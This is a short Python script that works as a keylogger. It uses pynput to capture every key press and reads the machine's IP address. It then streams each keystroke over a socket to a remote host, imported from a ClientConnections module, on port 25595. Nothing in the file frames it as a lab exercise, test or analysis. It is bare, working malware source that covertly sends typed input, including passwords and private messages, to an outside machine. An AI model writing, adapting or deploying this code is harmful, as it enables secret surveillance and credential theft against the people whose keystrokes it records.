import pynput
from pynput.keyboard import Key, Listener
import socket
from ClientConnections import HOST

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

s = socket.socket()
s.connect((HOST, 25595))

def on_press(key):
    s.send(f"{ip} {key}".encode())


with Listener(on_press=on_press) as Listener:
    Listener.join()
